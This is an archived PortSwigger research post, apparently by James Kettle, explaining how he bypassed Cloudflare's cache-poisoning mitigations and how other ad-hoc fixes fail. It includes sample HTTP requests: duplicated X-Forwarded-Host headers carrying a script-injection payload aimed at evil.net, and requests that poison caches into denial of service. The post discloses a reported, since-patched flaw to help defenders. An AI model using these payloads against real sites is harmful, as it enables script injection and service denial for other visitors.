---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-10-05_bypassing-web-cache-poisoning-countermeasures.md
original_filename: 2018-10-05_bypassing-web-cache-poisoning-countermeasures.md
title: Bypassing Web Cache Poisoning Countermeasures
category: documents
detected_topics:
- ssrf
- xss
- csrf
- sqli
- command-injection
- path-traversal
tags:
- imported
- documents
- ssrf
- xss
- csrf
- sqli
- command-injection
- path-traversal
language: en
raw_sha256: b6cb21520342a9ec65739839e7255e078bfb2f335d5f7275cf1cffe818068da0
text_sha256: 9220cc99ace3e24a0069f359b82404dfe216c478adc13c80c4afc9c25ab96f90
ingested_at: '2026-06-28T07:31:57Z'
sensitivity: unknown
redactions_applied: false
---

# Bypassing Web Cache Poisoning Countermeasures

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-10-05_bypassing-web-cache-poisoning-countermeasures.md
- Source Type: markdown
- Detected Topics: ssrf, xss, csrf, sqli, command-injection, path-traversal
- Ingested At: 2026-06-28T07:31:57Z
- Redactions Applied: False
- Raw SHA256: `b6cb21520342a9ec65739839e7255e078bfb2f335d5f7275cf1cffe818068da0`
- Text SHA256: `9220cc99ace3e24a0069f359b82404dfe216c478adc13c80c4afc9c25ab96f90`


## Content

---
title: "Bypassing Web Cache Poisoning Countermeasures"
page_title: "Bypassing Web Cache Poisoning Countermeasures | PortSwigger Research"
url: "https://portswigger.net/research/bypassing-web-cache-poisoning-countermeasures"
final_url: "https://portswigger.net/research/bypassing-web-cache-poisoning-countermeasures"
authors: ["James Kettle (@albinowax)"]
programs: ["Cloudflare"]
bugs: ["Web cache poisoning"]
publication_date: "2018-10-05"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5659
---

[](/)

[Login](/users)

Products Solutions [Research](/research) [Academy](/web-security) Support Company

[Customers](/customers) [About](/about) [Blog](/blog) [Careers](/careers) [Legal](/legal) [Contact](/contact) [Resellers](/support/reseller-faqs)

[My account](/users/youraccount) [Customers](/customers) [About](/about) [Blog](/blog) [Careers](/careers) [Legal](/legal) [Contact](/contact) [Resellers](/support/reseller-faqs)

[ ![Burp Suite DAST](/content/images/svg/icons/enterprise.svg) **Burp Suite DAST** The enterprise-enabled dynamic web vulnerability scanner. ](/burp/enterprise) [ ![Burp Suite Professional](/content/images/svg/icons/professional.svg) **Burp Suite Professional** The world's #1 web penetration testing toolkit. ](/burp/pro) [ ![Burp Suite Community Edition](/content/images/svg/icons/community.svg) **Burp Suite Community Edition** The best manual tools to start web security testing. ](/burp/communitydownload) [View all product editions](/burp)

[ **Burp Scanner** Burp Suite's web vulnerability scanner ![Burp Suite's web vulnerability scanner'](/mega-nav/images/burp-suite-scanner.jpg) ](/burp/vulnerability-scanner)

[ **Attack surface visibility** Improve security posture, prioritize manual testing, free up time. ](/solutions/attack-surface-visibility) [ **CI-driven scanning** More proactive security - find and fix vulnerabilities earlier. ](/solutions/ci-driven-scanning) [ **Application security testing** See how our software enables the world to secure the web. ](/solutions) [ **DevSecOps** Catch critical bugs; ship more secure software, more quickly. ](/solutions/devsecops) [ **Penetration testing** Accelerate penetration testing - find more bugs, more quickly. ](/solutions/penetration-testing) [ **Automated scanning** Scale dynamic scanning. Reduce risk. Save time/money. ](/solutions/automated-security-testing) [ **Bug bounty hunting** Level up your hacking and earn more bug bounties. ](/solutions/bug-bounty-hunting) [ **Compliance** Enhance security monitoring to comply with confidence. ](/solutions/compliance)

[View all solutions](/solutions)

[ **Product comparison** What's the difference between Pro and DAST? ![Burp Suite Professional vs Burp Suite DAST](/mega-nav/images/burp-suite.jpg) ](/burp/dast/resources/dast-vs-professional)

[ **Support Center** Get help and advice from our experts on all things Burp. ](/support) [ **Documentation** Tutorials and guides for Burp Suite. ](/burp/documentation) [ **Get Started - Professional** Get started with Burp Suite Professional. ](/burp/documentation/desktop/getting-started) [ **Get Started - DAST** Get started with Burp Suite DAST. ](/burp/documentation/dast/getting-started) [ **Downloads** Download the latest version of Burp Suite. ](/burp/releases)

[Visit the Support Center](/support)

[ **Downloads** Download the latest version of Burp Suite. ![The latest version of Burp Suite software for download](/mega-nav/images/latest-burp-suite-software-download.jpg) ](/burp/releases)

Articles

  * [Overview](/research)
  * Core Topics

[Black Hat](/research/black-hat) [XSS](/research/cross-site-scripting-research) [Request Smuggling](/research/request-smuggling) [Template Injection](/research/template-injection) [Top 10 Hacking Techniques](/research/top-10-web-hacking-techniques)

  * [Articles](/research/articles)
  * Meet the Researchers

[James Kettle](/research/james-kettle) [Gareth Heyes](/research/gareth-heyes) [Zakhar Fedotkin](/research/zakhar-fedotkin)

  * [Talks](/research/talks)
  * [ RSS  ](/research/rss)

# Bypassing Web Cache Poisoning Countermeasures

  * [ ](https://twitter.com/share?url=https%3A%2F%2Fportswigger.net%2Fresearch%2Fbypassing-web-cache-poisoning-countermeasures&text=Bypassing+Web+Cache+Poisoning+Countermeasures%20-%20%40PortSwiggerRes%0A)
  * [ ](https://api.whatsapp.com/send?text=https%3A%2F%2Fportswigger.net%2Fresearch%2Fbypassing-web-cache-poisoning-countermeasures)
  * [ ](https://reddit.com/submit?url=https%3A%2F%2Fportswigger.net%2Fresearch%2Fbypassing-web-cache-poisoning-countermeasures)
  * [ ](https://www.linkedin.com/sharing/share-offsite?url=https%3A%2F%2Fportswigger.net%2Fresearch%2Fbypassing-web-cache-poisoning-countermeasures)
  * [ ](mailto:?subject=Bypassing+Web+Cache+Poisoning+Countermeasures&body=Bypassing+Web+Cache+Poisoning+Countermeasures%0A%0AFollowing+my+presentation+and+whitepaper+on+Web+Cache+Poisoning+last+month%2C+various+companies+have+deployed+defences+in+an+attempt+to+mitigate+cache+poisoning+attacks.+In+this+post+I%E2%80%99ll+take+a+look+at%0A%0Ahttps://portswigger.net/research/bypassing-web-cache-poisoning-countermeasures)
  * [ ](/research/rss)

![James Kettle](/content/images/profiles/callout_james_kettle_112px.png)

### [James Kettle](/research/james-kettle)

Director of Research

[@albinowax](https://twitter.com/albinowax)

  * **Published:** Friday, 5 October 2018 at 15:00 UTC

  * **Updated:** Thursday, 29 September 2022 at 07:36 UTC

  * 

****

![](/cms/images/82/5d/3b6a23dba4a0-article-cache-poisoning-mitigation-article.png)  

Following my[presentation](https://www.youtube.com/watch?v=iSDoUGjfW3Q) and [whitepaper](https://portswigger.net/blog/practical-web-cache-poisoning) on [Web Cache Poisoning](/web-security/web-cache-poisoning) last month, various companies have deployed defences in an attempt to mitigate cache poisoning attacks. In this post I’ll take a look at some common weaknesses that can be used to bypass them.  
  
The research provoked responses from several major caching vendors. Akamai posted a minimal response, confusingly [citing mitigations](https://blogs.akamai.com/2018/08/on-cache-poisoning.html) for [Web Cache Deception](/web-security/web-cache-deception) which do virtually nothing to prevent Web Cache Poisoning. Fastly published a [security advisory](https://www.fastly.com/security-advisories/cache-poisoning-leveraging-various-x-headers) with detailed advice on mitigation, and Cloudflare took things one step further and deployed global mitigations, detailed in a blog post titled [How Cloudflare protects customers from cache poisoning](https://blog.cloudflare.com/cache-poisoning-protection/).  
  
Let’s take a closer look at the two defences deployed by Cloudflare. The first was to add a rule to their WAF to block XSS-friendly characters like < in certain headers used in my research, like X-Forwarded-Host:

`GET / HTTP/1.1  
Host: wafproxy.net  
X-Forwarded-Host: xss<  
  
HTTP/1.1 403 Forbidden  
  
Attention Required!  
`

This makes it harder to directly get [XSS](/web-security/cross-site-scripting) via cache poisoning using these headers but, as they note, still leaves some applications vulnerable as such characters aren't always required for an exploit. The second, more robust mitigation was to add these headers into their default cache key, theoretically making it impossible to use those headers for cache poisoning:

`GET / HTTP/1.1  
Host: wafproxy.net  
X-Forwarded-Host: evil.net  
  
HTTP/1.1 200 OK  
  
<a href="https://evil.net/"  
`

Cache key before mitigation: https://wafproxy.net/  
Cache key after mitigation: https://wafproxy.net/|evil.net

Unfortunately there’s a critical implementation flaw in both of these defences, meaning that they can be completely bypassed. The stage is set by a small optimisation that means Cloudflare don’t add the X-Forwarded-Host header to the cache key if it matches the Host header:

`GET / HTTP/1.1  
Host: wafproxy.net  
X-Forwarded-Host: wafproxy.net  
`Cache key after mitigation: https://wafproxy.net/

The fatal flaw is that Cloudflare only looks at the first instance of each header, so an attacker can provide a duplicate header, with the first instance being harmless and the second containing the payload. When a backend server handles such a request, it’ll typically concatenate the two header values using a comma.

`GET / HTTP/1.1  
Host: wafproxy.net  
X-Forwarded-Host: wafproxy.net  
X-Forwarded-Host: evil.net"/><script...  
  
HTTP/1.1 200 OK  
  
<a href="https://wafproxy.net, evil.net"/><script...  
`Cache key after mitigation: https://wafproxy.net/

I reported this issue to Cloudflare last week so it’ll probably be patched shortly and the cache key bypass has now been patched. Although their mitigation didn’t initially work out, they deserve credit for being the only vendor that tried technical mitigations, and now my bypass is patched I think they're the vendor with the most secure default configuration. That said, it’s worth noting that the mitigation won’t ever make sites hosted on Cloudflare immune to cache poisoning in general - it only prevents attacks using the most popular headers. 

Individual companies’ attempts to patch can go wrong, too. One common mistake is to detect a cache poisoning attack and block it with a response that’s cacheable. This effectively creates a denial of service issue. This hazard can also be caused by WAFs - for example www.tesla.com uses a WAF that blocks requests that contain the string ‘burpcollaborator.net’ in any header:

`GET /en_GB/roadster HTTP/1.1  
Host: www.tesla.com  
Any-Header: burpcollaborator.net  
  
HTTP/1.1 403 Forbidden  
  
Access Denied. Please contact waf@tesla.com  
`

After this attack, anyone that tried to access that page would find themselves blocked:  

`GET /en_GB/roadster HTTP/1.1  
Host: www.tesla.com  
  
HTTP/1.1 403 Forbidden  
  
Access Denied. Please contact waf@tesla.com  
`

The other mistake I’ve seen occurs when companies try to patch the framework that’s introducing the vulnerability, but underestimate the full potential of the header. For example, one target whitelisted acceptable values of the request.host variable, which is populated by the X-Forwarded-Host header. However, they didn’t notice that this header can also populate request.port, enabling a persistent denial of service:

`GET / HTTP/1.1  
Host: redacted.com  
X-Forwarded-Host: redacted.com:123  
  
HTTP/1.1 301 Moved Permanently  
Location: https://redacted.com:123/  
`

Ultimately, patching web cache poisoning on an ad-hoc basis can be tricky and the authors of web frameworks are the best placed people to resolve the most common types. Frameworks like Django and Flask have disabled support for these headers over recent years, and others like Ruby on Rails have been [repeatedly warned](https://github.com/rails/rails/issues/29893) but have only recently started to move toward deploying a fix.

Finally, I should mention I’ve pushed some substantial updates to [Param Miner](https://github.com/PortSwigger/param-miner) which will be released on Monday, notably including disabling the static ‘fcbz’ cache buster by default as it was breaking certain sites. This means that when using your browser or the Repeater to attempt cache poisoning, you’ll need to specify your own cache buster manually, or risk accidentally affecting other visitors.

Good luck and stay safe!

[ web cache poisoning ](/research/web-cache-poisoning)

[Back to all articles](/research/articles)

## Related Research

### [ Gotta cache 'em all: bending the rules of web cache exploitation 08 August 2024 Gotta cache 'em all: bending the rules of web cache exploitation ](/research/gotta-cache-em-all) ### [ Web Cache Entanglement 05 August 2020 Web Cache Entanglement ](/research/web-cache-entanglement) ### [ Responsible denial of service with web cache poisoning 24 October 2019 Responsible denial of service with web cache poisoning ](/research/responsible-denial-of-service-with-web-cache-poisoning) ### [ Practical Web Cache Poisoning Redefining 'unexploitable' 09 August 2018 Practical Web Cache Poisoning Redefining 'unexploitable' ](/research/practical-web-cache-poisoning)

Burp Suite

[Web vulnerability scanner](/burp/vulnerability-scanner) [Burp Suite Editions](/burp) [Release Notes](/burp/releases)

Vulnerabilities

[Cross-site scripting (XSS)](/web-security/cross-site-scripting) [SQL injection](/web-security/sql-injection) [Cross-site request forgery](/web-security/csrf) [XML external entity injection](/web-security/xxe) [Directory traversal](/web-security/file-path-traversal) [Server-side request forgery](/web-security/ssrf)

Customers

[Organizations](/organizations) [Testers](/testers) [Developers](/developers)

Company

[About](/about) [Careers](/careers) [Contact](/about/contact) [Legal](/legal) [Privacy Notice](/privacy) [Modern Slavery Statement](/modern-slavery-statement)

Insights

[Web Security Academy](/web-security) [Blog](/blog) [Research](/research) [Engineering](/engineering)

[![PortSwigger Logo](/content/images/logos/portswigger-logo.svg)](/) [ Follow us](https://twitter.com/Burp_Suite)

© 2026 PortSwigger Ltd.
